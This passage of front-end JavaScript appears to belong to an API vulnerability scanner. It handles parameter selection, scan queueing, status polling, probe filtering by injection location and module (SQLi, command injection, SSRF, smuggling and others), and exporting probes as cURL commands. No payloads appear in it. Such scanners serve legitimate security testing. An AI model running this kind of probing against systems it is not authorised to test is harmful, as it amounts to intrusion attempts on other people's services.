    <div class="as-type-option" onclick="_asPickType(${idx},'${t.key}')">
      <span class="as-type-label">${t.label}</span>
      <span class="as-type-hint">${t.hint}</span>
    </div>`).join("");

  document.body.appendChild(picker);

  // Position: below the button, right-aligned
  const rect = btnEl.getBoundingClientRect();
  const pw   = 210;
  let left   = rect.right - pw;
  if (left < 8) left = 8;
  picker.style.left = `${left}px`;
  picker.style.top  = `${rect.bottom + 5}px`;

  // Close on any outside click (next tick so this click doesn't close it)
  setTimeout(() => {
    document.addEventListener("click", _asCloseTypePicker, { once: true, capture: true });
  }, 0);
}

function _asCloseTypePicker() {
  const el = document.getElementById("as-type-picker");
  if (el) el.remove();
  _asPickerActiveIdx = -1;
}

function _asPickType(idx, typeKey) {
  _asCloseTypePicker();
  const p = _asParamsList[idx];
  if (!p) return;
  const key = _asParamKey(p);
  // Put the FORMAT STRING in the input (backend will expand it fresh per probe)
  const fmt = _asTypeToFmt(typeKey, p.current_value, p.param_name);
  _asParamCustomVals[key] = fmt;
  const inp = document.getElementById(`as-pm-val-${idx}`);
  if (inp) { inp.value = fmt; inp.classList.toggle("as-fmt-input", _asIsFmtStr(fmt)); }
  const chk = document.getElementById(`as-pm-chk-${idx}`);
  if (chk) chk.checked = true;
  // Always enable regen when a format type is picked
  _asParamRegenMap[key] = true;
  _asApplyRegenBtn(idx, true);
}

// ── Modal render ──────────────────────────────────────────────────────────────

async function _asShowParamsModal(params, checkedEntries) {
  _asParamsList      = params;
  _asCheckedEntries  = checkedEntries;
  _asParamCustomVals = {};  // all empty — user fills explicitly
  _asParamRegenMap   = {};  // starts OFF; auto-enabled when user types/picks a value

  const tbody = document.getElementById("as-params-tbody");
  if (tbody) {
    const multiEntry = new Set(params.map(p => p.entry_id)).size > 1;
    let lastEntryId  = null;
    let html         = "";

    params.forEach((p, idx) => {
      // ── Entry group header (multi-API) ──────────────────────────────
      if (multiEntry && p.entry_id !== lastEntryId) {
        lastEntryId = p.entry_id;
        const mCls    = `method-badge method-${(p.entry_method||"GET").toUpperCase()}`;
        const urlPath = (() => {
          try { return new URL(p.entry_url||"").pathname.slice(0, 55); }
          catch { return (p.entry_url||"").slice(0, 55); }
        })();
        html += `<tr class="as-params-entry-header">
          <td colspan="5">
            <span class="${mCls}" style="font-size:9px">${_asEsc(p.entry_method||"GET")}</span>
            <span style="margin-left:6px;font-family:var(--mono);font-size:10px;color:var(--text2)"
                  title="${_asEsc(p.entry_url||"")}">${_asEsc(urlPath)}</span>
          </td>
        </tr>`;
      }

      // ── Param row ───────────────────────────────────────────────────
      const cvDisp = (p.current_value || "").slice(0, 22);
      html += `<tr>
        <td>
          <input type="checkbox" class="req-checkbox" id="as-pm-chk-${idx}"
                 onchange="_asParamToggle(${idx}, this.checked)">
        </td>
        <td class="as-param-name-cell" title="${_asEsc(p.param_name)}">${_asEsc(p.param_name)}</td>
        <td>
          <span class="as-param-loc-badge ${p.location}">${_asEsc(p.location)}</span>
        </td>
        <td class="as-param-current-val" title="${_asEsc(p.current_value||"")}">${_asEsc(cvDisp)}</td>
        <td>
          <div style="display:flex;gap:4px;align-items:center">
            <input type="text" id="as-pm-val-${idx}" value=""
                   placeholder="blank = use original"
                   oninput="_asParamValInput(${idx}, this.value)"
                   class="as-param-value-input">
            <button class="as-param-regen-btn" title="Choose value type"
                    onclick="_asOpenTypePicker(${idx}, this)">⚙️</button>
            <button class="as-param-regen-btn" id="as-pm-regen-${idx}"
                    title="🔒 Fixed — same custom value used for all probes. Click to enable per-probe regen."
                    onclick="_asToggleRegen(${idx})">🔒</button>
          </div>
        </td>
      </tr>`;
    });

    tbody.innerHTML = html;
  }

  const countEl = document.getElementById("as-params-count");
  if (countEl) countEl.textContent = `${params.length} param${params.length !== 1 ? "s" : ""} detected`;
  const modal = document.getElementById("as-params-modal");
  if (modal) modal.style.display = "flex";
}

// ⚡ Auto-fill All → set format template for every param + enable regen
function asGenerateAllParams() {
  _asParamsList.forEach((p, idx) => {
    const key = _asParamKey(p);
    const fmt = _asAutoFmt(p.current_value, p.param_name);
    _asParamCustomVals[key] = fmt;
    const inp = document.getElementById(`as-pm-val-${idx}`);
    if (inp) { inp.value = fmt; inp.classList.toggle("as-fmt-input", _asIsFmtStr(fmt)); }
    const chk = document.getElementById(`as-pm-chk-${idx}`);
    if (chk) chk.checked = true;
    _asParamRegenMap[key] = true;
    _asApplyRegenBtn(idx, true);
  });
}

function _asCloseModal() {
  _asCloseTypePicker();
  const modal = document.getElementById("as-params-modal");
  if (modal) modal.style.display = "none";
}

function asSkipParams() {
  _asCloseModal();
  _asDoStartScan(_asCheckedEntries, []);
}

function asConfirmParams() {
  _asCloseModal();

  // Include params that are:
  //  (a) checked with a non-empty custom value, OR
  //  (b) regen_per_probe=true (even without a manually typed value — backend will auto-gen)
  const customValues = [];
  _asParamsList.forEach((p, idx) => {
    const key   = _asParamKey(p);
    const chk   = document.getElementById(`as-pm-chk-${idx}`);
    const isChk = chk && chk.checked;
    const val   = (_asParamCustomVals[key] || "").trim();
    const regen = !!_asParamRegenMap[key];

    if (!isChk && !regen) return;   // not selected and not regen — skip
    if (!val && !regen)   return;   // no value and no regen — skip

    customValues.push({
      entry_id:         p.entry_id,
      param_name:       p.param_name,
      location:         p.location,
      value:            val || p.current_value || "",  // fallback to original if only regen
      original_value:   p.current_value || "",
      regen_per_probe:  regen,
    });
  });
  _asDoStartScan(_asCheckedEntries, customValues);
}

// ── Start scan flow ───────────────────────────────────────────────────────────
async function asStartScan() {
  const checked = _asEntries.filter(e => _asChecked[e.id]);
  if (!checked.length) return;

  const profileSel = document.getElementById("as-profile-select");
  const threadsSel = document.getElementById("as-threads-input");
  const timeoutSel = document.getElementById("as-timeout-input");
  const delaySel   = document.getElementById("as-delay-select");
  _asProfile = profileSel ? profileSel.value : "full";
  _asThreads = threadsSel ? parseInt(threadsSel.value)||6  : 6;
  _asTimeout = timeoutSel ? parseInt(timeoutSel.value)||10 : 10;
  _asDelaySec = delaySel ? (parseFloat(delaySel.value) || 0) : 0;

  // ── Burp-like queue mode ──────────────────────────────────────────────────
  // If a scan is running (or just finished its idle window), add these entries
  // to the existing job's queue instead of starting a new job.
  // _asQueueEntries handles 409 (job already closed) by falling through to a
  // fresh scan that APPENDS to _asAllEntriesDone — so results always accumulate.
  if (_asJobId && (_asScanState === "running" || _asScanState === "paused_auth"
      || _asScanState === "done")) {
    await _asQueueEntries(checked);
    return;
  }

  // ── Fresh scan ────────────────────────────────────────────────────────────
  // Show loading indicator on button
  const btn = document.getElementById("as-scan-btn");
  if (btn) { btn.disabled = true; btn.textContent = "⏳ Detecting params…"; }

  try {
    const r = await fetch(`${AS_BASE}/apiscan/detect_params`, {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({entries: checked.map(e=>({id:e.id,method:e.method,url:e.url,headers:e.headers,body:e.body||""}))})
    });
    if (r.ok) {
      const d = await r.json();
      if (d.params && d.params.length > 0) {
        _asUpdateScanBtn();  // restore button
        await _asShowParamsModal(d.params, checked);
        return;  // wait for user to confirm/skip in modal
      }
    }
  } catch(e) { /* backend unreachable — proceed without params */ }

  _asUpdateScanBtn();
  _asDoStartScan(checked, []);
}

// ── Add entries to an existing running scan (Burp-like queue) ─────────────────
async function _asQueueEntries(checkedEntries) {
  const btn = document.getElementById("as-scan-btn");
  if (btn) { btn.disabled = true; btn.textContent = "⏳ Adding to queue…"; }

  try {
    const r = await fetch(`${AS_BASE}/apiscan/queue/${_asJobId}`, {
      method:  "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        entries:       checkedEntries.map(e => ({id:e.id, method:e.method, url:e.url, headers:e.headers, body:e.body||""})),
        ..._asScanOptionsPayload(),
        custom_values: _asScanCustomsSaved || [],
      }),
    });

    if (r.status === 409) {
      // Job just completed in the narrow window — fall through to fresh scan
      _asUpdateScanBtn();
      _asDoStartScan(checkedEntries, _asScanCustomsSaved || []);
      return;
    }
    if (!r.ok) {
      const e = await r.json().catch(() => ({}));
      _asShowToast("Queue error: " + (e.detail || r.statusText));
      _asUpdateScanBtn();
      return;
    }

    const d = await r.json();
    _asShowToast(`➕ ${checkedEntries.length} API${checkedEntries.length !== 1 ? "s" : ""} added to scan queue (${d.total_queued} total)`);

    // Mark newly queued entries as in-progress
    checkedEntries.forEach(e => _asScanningUrls.add(_asUrlKey(e.url)));
    _asRenderList();

    // Keep track for resume-after-stop
    _asScanEntriesSaved = (_asScanEntriesSaved || []).concat(checkedEntries);

    asSwitchTab("scanning");
  } catch(e) {
    _asShowToast("Cannot contact backend: " + e.message);
  }
  _asUpdateScanBtn();
}

async function _asDoStartScan(checkedEntries, customValues, isResume) {
  isResume = !!isResume;

  // Public OOB fallback needs an explicit OK (canary DNS leaves the LAN)
  if (!_asConfirmPublicOob()) {
    _asUpdateScanBtn();
    return;
  }

  if (isResume) {
    // ── RESUME: keep existing probes, append new ones after a separator ──────
    _asProbeIdOffset   = _asProbes.length;   // offset so new IDs don't collide with old rows
    _asProbeOffset     = 0;                  // new job starts at probe-count 0
    _asFirstIssueSeen  = false;
    _asProbeAutoScroll = true;
    // Add a visual separator to the probe list
    const list = document.getElementById("as-probe-list");
    if (list) {
      const sep = document.createElement("div");
      sep.className = "as-probe-resume-sep";
      sep.textContent = "─── Resumed ───";
      list.appendChild(sep);
    }
    // Reset per-job results but keep old ones visible (will be merged)
    _asExpanded        = {};
    _asSevFilter       = "ALL";
  } else {
    // ── FRESH SCAN: reset scan-specific state, but KEEP accumulated results ──
    // _asAllEntriesDone / _asScannedUrls are NOT cleared — only asReset() does that.
    _asProbes          = [];
    _asProbeOffset     = 0;
    _asProbeIdOffset   = 0;
    _asSelProbeId      = null;
    _asExpanded        = {};
    _asSevFilter       = "ALL";
    _asFirstIssueSeen  = false;
    _asProbeAutoScroll = true;
    _asProbeModuleFilter = "all";
    _asProbeModuleSeen   = new Set();
    _asProbeSearch       = "";
    _asLogOffset         = 0;
    const _psInp = document.getElementById("as-probe-search");
    if (_psInp) _psInp.value = "";
    const _psClr = document.getElementById("as-probe-search-clear");
    if (_psClr) _psClr.style.display = "none";
    _asSelResultIdx    = null;
    _asSelResultCurl   = "";
    _asRdRaw  = {req: "", resp: ""}; _asRdBase = {req: "", resp: ""};
    const _rdPanel = document.getElementById("as-result-detail");
    if (_rdPanel) _rdPanel.style.display = "none";
    // Seed _asResults from accumulator so old results stay visible immediately
    _asResults = _asAllEntriesDone.length > 0
      ? { entries_done: _asAllEntriesDone }
      : null;
    if (_asResults) _asRenderResults();
    // Mark all new entries as "in-progress" (clear old in-progress set first)
    _asScanningUrls = new Set(checkedEntries.map(e => _asUrlKey(e.url)));
    _asRenderList();   // show 🔄 in-progress + ✓ scanned badges immediately
    // Save for Resume-after-Stop
    _asScanEntriesSaved = checkedEntries;
    _asScanCustomsSaved = customValues;
  }

  const payload = {
    entries:       checkedEntries.map(e=>({id:e.id,method:e.method,url:e.url,headers:e.headers,body:e.body||""})),
    ..._asScanOptionsPayload(),
    custom_values: customValues,
  };

  try {
    const r = await fetch(`${AS_BASE}/apiscan/start`, {
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify(payload),
    });
    if (!r.ok) {
      const e = await r.json().catch(() => ({}));
      const det = e.detail;
      const msg = typeof det === "string" ? det : (e.detail || r.statusText);
      if (r.status === 409) {
        alert("A scan is already running. Stop it first, or use Add to Queue on the active scan.");
        asSwitchTab("scanning");
      } else {
        alert("Scan start error: " + msg);
      }
      return;
    }
    const d = await r.json();
    _asJobId = d.job_id;
  } catch(e) { alert("Cannot contact API Scan backend: "+e.message); return; }

  // Reset scanning panel (fresh scan only — resume keeps existing probe rows)
  if (!isResume) {
    const pl = document.getElementById("as-probe-list");
    if (pl) pl.innerHTML = "";
    _asShowProbePlaceholder();
    // Clear stale probe count from any previous scan
    const cntEl = document.getElementById("as-probe-count");
    if (cntEl) cntEl.textContent = "";
  }
  _asRenderProgress({current:0, total:checkedEntries.length, pct:0, api:"Initializing…"}, 0);
  _asUpdateStopBtn("running");
  _asUpdateScanBtn();   // switch label to "➕ Add to Queue" while running

  asSwitchTab("scanning");
  _asStartPolling();
}

// ── Polling ───────────────────────────────────────────────────────────────────
function _asStartPolling() {
  if (_asPollTimer) clearInterval(_asPollTimer);
  _asPollTimer = setInterval(async () => {
    if (!_asJobId) return;
    try {
      const r = await fetch(`${AS_BASE}/apiscan/status/${_asJobId}?since=${_asLogOffset}&since_probe=${_asProbeOffset}`);
      if (!r.ok) return;
      const data = await r.json();

      if (typeof data.log_count === "number") {
        _asLogOffset = data.log_count;
      } else if (data.logs && data.logs.length) {
        _asLogOffset += data.logs.length;
      }

      // Append new probes (apply ID offset when resuming so rows don't conflict)
      const newProbes = data.new_probes || [];
      if (newProbes.length) {
        const offsetProbes = _asProbeIdOffset > 0
          ? newProbes.map(p => ({ ...p, id: p.id + _asProbeIdOffset }))
          : newProbes;
        _asProbes.push(...offsetProbes);
        _asProbeOffset = data.probe_count || newProbes.length;   // backend count (no offset)
        _asRenderProbeList(offsetProbes);
      }

      _asRenderProgress(data.progress, data.issues_so_far || 0);

      // ── Session expired — pause for fresh token ─────────────────────────────
      if ((data.status === "paused_auth" || data.auth_paused) && !data.auth_pause_skipped) {
        _asUpdateStopBtn("paused_auth");
        _asShowAuthBanner(data.auth_pause_reason);
        asSwitchTab("scanning");
        if (!_asAuthPauseNotified) {
          _asAuthPauseNotified = true;
          _asShowToast("⏸ Auth expired — paste a new token to resume (or Skip)", 4000);
        }
      } else if (data.status === "running") {
        if (_asScanState === "paused_auth") {
          _asHideAuthBanner();
          _asUpdateStopBtn("running");
        }
      }

      // ── Live results — render as issues are intercepted mid-scan ─────────────
      // Merge accumulated entries from previous scans (_asAllEntriesDone) with
      // the current job's live entries so the Results tab always shows everything.
      const liveCount = data.issues_so_far || 0;
      if (data.entries_done && data.entries_done.length > 0) {
        _asResults = { entries_done: [..._asAllEntriesDone, ...data.entries_done] };
        _asRenderResults();

        // Update / create the live badge on the Results tab button
        const rtBtn = document.getElementById("as-tab-results");
        if (rtBtn) {
          let badge = rtBtn.querySelector(".as-live-badge");
          if (!badge) {
            badge = document.createElement("span");
            badge.className = "as-live-badge";
            rtBtn.appendChild(badge);
          }
          badge.textContent = liveCount > 0 ? ` 🚨${liveCount}` : "";
          badge.style.display = liveCount > 0 ? "inline" : "none";
        }

        // First time an issue appears: switch to Results tab automatically
        // (skip auto-switch while waiting for auth — user needs the banner)
        if (!_asFirstIssueSeen && liveCount > 0 && data.status !== "paused_auth") {
          _asFirstIssueSeen = true;
          asSwitchTab("results");
          _asShowToast(`🚨 ${liveCount} issue${liveCount > 1 ? "s" : ""} found — scan still running`, 3500);
        }
      }

      if (data.status === "done") {
        clearInterval(_asPollTimer); _asPollTimer = null;
        _asHideAuthBanner();
        _asUpdateStopBtn("done");
        _asUpdateScanBtn();   // shows "➕ Add to Scan" (results accumulate until Reset)
        // Remove live badge from Results tab
        const rtBtn = document.getElementById("as-tab-results");
        if (rtBtn) { const b = rtBtn.querySelector(".as-live-badge"); if (b) b.remove(); }
        let finalEntries = [];
        try {
          const rr = await fetch(`${AS_BASE}/apiscan/results/${_asJobId}`);
          const finalData = await rr.json();
          finalEntries = finalData.entries_done || [];
        } catch(e) { finalEntries = []; }
        // Accumulate this job's completed entries into the persistent store
        _asAllEntriesDone = [..._asAllEntriesDone, ...finalEntries];
        // Move all in-progress URLs → scanned, clear in-progress set
        _asScanningUrls.forEach(u => _asScannedUrls.add(u));
        // Also add any URLs from finalEntries that weren't in the queue
        finalEntries.forEach(ed => {
          const k = _asUrlKey(ed.entry?.url || "");
          if (k) _asScannedUrls.add(k);
        });
        _asScanningUrls = new Set();
        _asResults = { entries_done: _asAllEntriesDone };
        _asRenderResults();
        _asRenderList();   // refresh "✓ scanned" badges
        asSwitchTab("results");
      }
    } catch(e) { /* network error — keep polling */ }
  }, 1000);
}

// ── Probe type detection ──────────────────────────────────────────────────────
function _asGetProbeType(probe) {
  const payload = (probe.payload || "").trim();
  if (!payload) return "passive";

  const param   = (probe.param    || "").toLowerCase();
  const headers = probe.req_headers || {};
  const body    = probe.req_body    || "";
  const url     = probe.url         || "";

  // Dot-notation params are nested JSON — always body
  if (param.includes(".") || param.includes("[")) return "body";

  // Check if param name matches a request header key
  if (param && Object.keys(headers).some(k => k.toLowerCase() === param)) return "header";

  // Check URL query string (try both raw and decoded)
  try {
    const uo = new URL(url);
    if (uo.searchParams.has(probe.param) || uo.searchParams.has(param)) return "query";
    const rawSearch     = uo.search;
    const decodedSearch = _asTryDecode(rawSearch);
    if (rawSearch.includes(encodeURIComponent(payload)) || rawSearch.includes(payload)
        || decodedSearch.includes(payload)) return "query";
  } catch {}

  // Check URL path segment — try raw, URL-encoded, and decoded forms
  try {
    const uo           = new URL(url);
    const rawPath      = uo.pathname;
    const decodedPath  = _asTryDecode(rawPath);
    const encodedPl    = encodeURIComponent(payload);
    if (rawPath.includes(payload) || rawPath.includes(encodedPl)
        || decodedPath.includes(payload)) return "path";
  } catch {}

  // Check body (try both raw and JSON-escaped)
  if (body) {
    if (body.includes(payload)) return "body";
    try {
      const escaped = JSON.stringify(payload).slice(1, -1);
      if (body.includes(escaped)) return "body";
    } catch {}
  }

  return "other";
}

/** Safely URL-decode a string, returning the original on failure. */
function _asTryDecode(s) {
  try { return decodeURIComponent(s); } catch { return s; }
}

// Friendly display names for scanner Module/Category keys (mirrors Scan.py _ALL_MODULES).
// Unknown/future module keys fall back to a title-cased version of the raw key.
const _AS_MODULE_LABELS = {
  sqli: "SQL Injection (SQLi)",
  nosqli: "NoSQL Injection (MongoDB/CouchDB)",
  xss: "Cross-Site Scripting (Reflected XSS)",
  lfi: "Local File Inclusion & Traversal (LFI)",
  cmdi: "OS Command Injection (RCE)",
  ssrf: "Server-Side Request Forgery (SSRF)",
  redirect: "Open URL Redirection",
  crlf: "CRLF / Response Splitting",
  xxe: "XML External Entity (XXE)",
  ssti: "Server-Side Template Injection (SSTI)",
  idor: "Insecure Direct Object Reference (IDOR)",
  jwt: "JWT Authentication Bypass & Weak Secret",
  massassign: "Mass Assignment & Privilege Elevation",
  cors: "CORS Misconfiguration",
  graphql: "GraphQL Introspection & Abuse",
  prototype_pollution: "JavaScript Prototype Pollution",
  hpp: "HTTP Parameter Pollution (HPP)",
  xpath: "XPath Injection",
  ldap: "LDAP Injection",
  deserial: "Insecure Deserialization",
  ratelimit: "Rate Limiting & Brute-Force Bypass",
  smuggling: "HTTP Request Smuggling (CL.TE / TE.CL)",
  api_version: "API Versioning & Deprecated Routes",
  hosthdr: "Host Header Injection & Poisoning",
  csrf: "Cross-Site Request Forgery (CSRF)",
  authz: "Broken Function Authorization (BFLA)",
  exposure: "Excessive Data Exposure (PII / Secrets)",
  debug_params: "Hidden Debug & Admin Parameters",
  verb_tampering: "HTTP Method / Verb Tampering",
  ip_spoofing: "IP Spoofing & Proxy Header Bypass",
  content_type_tamper: "Content-Type & MIME Confusion",
  resource_exhaustion: "Resource & Pagination Exhaustion",
};
function _asModuleLabel(key) {
  if (!key) return "Other / Unclassified";
  return _AS_MODULE_LABELS[key]
      || key.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
}

// Apply BOTH the Type pills (HDR/QRY/BDY/PATH), the Module/Category dropdown,
// and the search query to every probe row — a row is visible only when it matches all active filters.
function _asApplyProbeFilters() {
  const q = _asProbeSearch;
  const list = document.getElementById("as-probe-list");
  if (!list) return;
  list.querySelectorAll(".as-probe-row").forEach(row => {
    const rt = row.dataset.probeType   || "other";
    const rm = row.dataset.probeModule || "";
    const typeOk = (_asProbeFilter === "all" || rt === _asProbeFilter);
    const modOk  = (_asProbeModuleFilter === "all" || rm === _asProbeModuleFilter);
    let searchOk = true;
    if (q) {
      const u = row.dataset.probeUrl    || "";
      const p = row.dataset.probeParam  || "";
      const m = row.dataset.probeMethod || "";
      const t = row.textContent ? row.textContent.toLowerCase() : "";
      searchOk = u.includes(q) || p.includes(q) || m.includes(q) || t.includes(q);
    }
    row.style.display = (typeOk && modOk && searchOk) ? "" : "none";
  });
  _asUpdateProbeTypeCounts();
}

function asProbeSearch(val) {
  clearTimeout(_asProbeSearchTimer);
  _asProbeSearchTimer = setTimeout(() => {
    _asProbeSearch = (val || "").trim().toLowerCase();
    const clrBtn = document.getElementById("as-probe-search-clear");
    if (clrBtn) clrBtn.style.display = _asProbeSearch ? "inline-block" : "none";
    _asApplyProbeFilters();
  }, 120);
}

function asClearProbeSearch() {
  clearTimeout(_asProbeSearchTimer);
  const inp = document.getElementById("as-probe-search");
  if (inp) inp.value = "";
  _asProbeSearch = "";
  const clrBtn = document.getElementById("as-probe-search-clear");
  if (clrBtn) clrBtn.style.display = "none";
  _asApplyProbeFilters();
}

// Re-apply current type filter to all existing probe rows (used when switching filter)
function asProbeFilter(type) {
  _asProbeFilter = type;
  document.querySelectorAll(".as-probe-type-btn").forEach(b =>
    b.classList.toggle("active", b.dataset.type === type));
  _asApplyProbeFilters();
}

// Module/Category filter — dropdown listing every scanner module that has fired
// at least one probe so far; selecting one shows only that module's test cases
// (combined with the active HDR/QRY/BDY/PATH pill) for easier manual validation.
function asProbeModuleFilter(mod) {
  _asProbeModuleFilter = mod || "all";
  _asApplyProbeFilters();
}

function _asUpdateProbeModuleOptions() {
  const sel = document.getElementById("as-probe-module-filter");
  if (!sel) return;

  const counts = {};
  _asProbes.forEach(p => {
    const m = p.module || "";
    counts[m] = (counts[m] || 0) + 1;
    _asProbeModuleSeen.add(m);
  });

  const keys = [..._asProbeModuleSeen]
    .sort((a, b) => _asModuleLabel(a).localeCompare(_asModuleLabel(b)));

  const prevVal = _asProbeModuleFilter;
  sel.innerHTML = `<option value="all">All Modules (${_asProbes.length})</option>` +
    keys.map(k =>
      `<option value="${_asEsc(k)}">${_asEsc(_asModuleLabel(k))} (${counts[k] || 0})</option>`
    ).join("");

  sel.value = [...sel.options].some(o => o.value === prevVal) ? prevVal : "all";
  _asProbeModuleFilter = sel.value;
}

function _asUpdateProbeTypeCounts() {
  const counts = { all: _asProbes.length, header: 0, query: 0, body: 0, path: 0, other: 0, passive: 0 };
  _asProbes.forEach(p => { const t = _asGetProbeType(p); if (t in counts) counts[t]++; });

  document.querySelectorAll(".as-probe-type-btn[data-type]").forEach(b => {
    const t   = b.dataset.type;
    const cnt = counts[t] ?? 0;
    if (t === "all") {
      b.textContent = `All (${cnt})`;
    } else {
      const label = { header:"HDR", query:"QRY", body:"BDY", path:"PATH" }[t] || t.toUpperCase();
      b.textContent = cnt > 0 ? `${label} (${cnt})` : label;
      b.style.opacity = cnt > 0 ? "1" : "0.4";
    }
  });

  // Update count label in header — reflects BOTH the type pill and the
  // Module/Category dropdown when either is narrowed down from "all"
  const cntEl = document.getElementById("as-probe-count");
  if (cntEl) {
    if (_asProbeFilter === "all" && _asProbeModuleFilter === "all" && !_asProbeSearch) {
      cntEl.textContent = `(${_asProbes.length})`;
    } else {
      const visCount = _asProbes.filter(p => {
        const typeOk = (_asProbeFilter === "all" || _asGetProbeType(p) === _asProbeFilter);
        const modOk  = (_asProbeModuleFilter === "all" || (p.module || "") === _asProbeModuleFilter);
        let searchOk = true;
        if (_asProbeSearch) {
          const u = (p.url || "").toLowerCase();
          const param = (p.param || "").toLowerCase();
          const m = (p.method || "").toLowerCase();
          searchOk = u.includes(_asProbeSearch) || param.includes(_asProbeSearch) || m.includes(_asProbeSearch);
        }
        return typeOk && modOk && searchOk;
      }).length;
      cntEl.textContent = `(${visCount}/${_asProbes.length})`;
    }
  }
}

// ── Probe list (scanning tab left panel) ──────────────────────────────────────
function _asRenderProbeList(newProbes) {
  const list = document.getElementById("as-probe-list");
  if (!list) return;

  // Update live probe counter in the section header
  const cntEl = document.getElementById("as-probe-count");
  if (cntEl) cntEl.textContent = `(${_asProbes.length} probes)`;

  const frag = document.createDocumentFragment();

  newProbes.forEach(p => {
    const row  = document.createElement("div");
    row.className = "as-probe-row";
    row.id        = `as-probe-row-${p.id}`;
    row.dataset.probeId = String(p.id);
    row.onclick   = () => {
      const list = document.getElementById("as-probe-list");
      if (list) list.focus({ preventScroll: true });
      asSelectProbe(p.id);
    };

    const probeType = _asGetProbeType(p);
    row.dataset.probeType   = probeType;
    row.dataset.probeModule = p.module || "";
    row.dataset.probeUrl    = (p.url || "").toLowerCase();
    row.dataset.probeParam  = (p.param || "").toLowerCase();
    row.dataset.probeMethod = (p.method || "").toLowerCase();

    // Apply current Type + Module/Category + Search filters immediately
    const _typeOk = (_asProbeFilter === "all" || probeType === _asProbeFilter);
    const _modOk  = (_asProbeModuleFilter === "all" || (p.module || "") === _asProbeModuleFilter);
    let _searchOk = true;
    if (_asProbeSearch) {
      const u = row.dataset.probeUrl;
      const param = row.dataset.probeParam;
      const m = row.dataset.probeMethod;
      _searchOk = u.includes(_asProbeSearch) || param.includes(_asProbeSearch) || m.includes(_asProbeSearch);
    }
    if (!(_typeOk && _modOk && _searchOk)) {
      row.style.display = "none";
    }

    const st       = p.status || 0;
    const stCls    = st >= 500 ? "status-5xx" : st >= 400 ? "status-4xx" : st >= 300 ? "status-3xx" : st >= 200 ? "status-2xx" : "status-err";
    const mCls     = `method-badge method-${(p.method||"GET").toUpperCase()}`;
    const urlFull  = p.url || "";
    let urlDisp;
    try {
      const uo = new URL(urlFull);
      urlDisp  = uo.pathname + (uo.search.length > 40 ? uo.search.slice(0,40)+"…" : uo.search);
    } catch { urlDisp = urlFull.slice(0, 70); }

    // Type badge — skip passive (no injection — showing "—" just clutters the row)
    const typeLabel = { header:"HDR", query:"QRY", body:"BDY", path:"PATH" };
    const typeBadge = (probeType !== "other" && probeType !== "passive")
      ? `<span class="as-probe-type-tag as-pt-${probeType}" title="${probeType} injection">${typeLabel[probeType] || probeType.toUpperCase().slice(0,3)}</span>`
      : "";

    // Elapsed time badge — only shown for notably slow probes (>2s).
    // Visually flags timing-based findings (smuggling desync, blind SSRF, etc.)
    // without adding noise to the normal fast probes.
    const _rowMs = p.elapsed_ms || 0;
    const elapsedTag = _rowMs > 2000
      ? `<span style="font-size:8.5px;font-family:var(--mono);flex-shrink:0;
                      color:${_rowMs > 5000 ? '#f85149' : '#e3b341'};opacity:.85"
               title="${_rowMs.toFixed(0)}ms">${(_rowMs/1000).toFixed(1)}s</span>`
      : "";

    const paramTag = p.param
      ? `<span class="as-probe-param-lbl" title="Tested parameter">${_asEsc(p.param)}</span>`
      : "";

    row.innerHTML = `
      <span class="as-probe-num">#${p.id + 1}</span>
      <span class="${mCls}">${_asEsc(p.method||"")}</span>
      <span class="as-probe-url" title="${_asEsc(urlFull)}">${_asEsc(urlDisp)}</span>
      ${paramTag}
      ${elapsedTag}
      ${typeBadge}
      <span class="status-pill ${stCls}">${st || "?"}</span>`;

    frag.appendChild(row);
  });

  list.appendChild(frag);

  // Keep DOM lean if probe list grows large (cap live DOM elements to recent 1,200)
  const MAX_DOM_PROBES = 1200;
  const probeRows = list.querySelectorAll(".as-probe-row");
  if (probeRows.length > MAX_DOM_PROBES) {
    const excess = probeRows.length - MAX_DOM_PROBES;
    for (let i = 0; i < excess; i++) {
      probeRows[i].remove();
    }
  }

  // Update type counts + Module/Category dropdown after new probes added
  _asUpdateProbeTypeCounts();
  _asUpdateProbeModuleOptions();

  // Auto-scroll to bottom only when _asProbeAutoScroll is true.
  if (_asProbeAutoScroll) list.scrollTop = list.scrollHeight;

  // Auto-select the latest probe
  if (newProbes.length && _asSelProbeId === null) {
    asSelectProbe(newProbes[newProbes.length - 1].id);
  } else if (newProbes.length) {
    const latestId = newProbes[newProbes.length - 1].id;
    if (_asSelProbeId === _asProbes[_asProbes.length - 1 - newProbes.length]?.id || _asSelProbeId === null) {
      asSelectProbe(latestId);
    }
  }
}

/** Copy the selected probe as a cURL command.
 *  Keeps ALL headers (including Content-Length / Transfer-Encoding) so
 *  the generated curl exactly reflects what was sent — especially important
 *  for smuggling probes where those headers ARE the attack vector. */
function asCopyCurlFromProbe(probeId) {
  const probe = _asProbes.find(p => p.id === probeId);
  if (!probe) { _asShowToast("No probe selected"); return; }
  const method  = (probe.method || "GET").toUpperCase();
  const url     = probe.url || "";
  if (!url) { _asShowToast("No URL for this probe"); return; }

  const lines = [`curl -sk -X ${method}`];
  for (const [k, v] of Object.entries(probe.req_headers || {})) {
    const safeV = String(v).replace(/'/g, "'\\''");
    lines.push(`  -H '${k}: ${safeV}'`);
  }
  if (probe.req_body) {
    const safeBody = String(probe.req_body).replace(/'/g, "'\\''");
    lines.push(`  --data-raw '${safeBody}'`);
  }
  lines.push(`  '${url.replace(/'/g, "'\\''")}'`);
  const curlCmd = lines.join(" \\\n");

  if (navigator.clipboard?.writeText) {
    navigator.clipboard.writeText(curlCmd).then(
      ()  => _asShowToast("📋 cURL copied"),
      ()  => _asFallbackCopy(curlCmd)
    );
  } else {
    _asFallbackCopy(curlCmd);
  }
}

function asSelectProbe(probeId) {
  _asSelProbeId = probeId;

  // Highlight selected row
  document.querySelectorAll(".as-probe-row").forEach(r => r.classList.remove("selected"));
  const selRow = document.getElementById(`as-probe-row-${probeId}`);
  if (selRow) {
    selRow.classList.add("selected");
    selRow.scrollIntoView({ block: "nearest" });
  }

  const probe = _asProbes.find(p => p.id === probeId);
  if (!probe) return;

  const reqPanel  = document.getElementById("as-req-panel");
  const respPanel = document.getElementById("as-resp-panel");
  if (!reqPanel || !respPanel) return;

  const reqHdrs  = Object.entries(probe.req_headers  || {}).map(([k,v]) => `${k}: ${v}`).join("\n");
  const respHdrs = Object.entries(probe.resp_headers || {}).map(([k,v]) => `${k}: ${v}`).join("\n");
  const pload    = probe.payload || "";
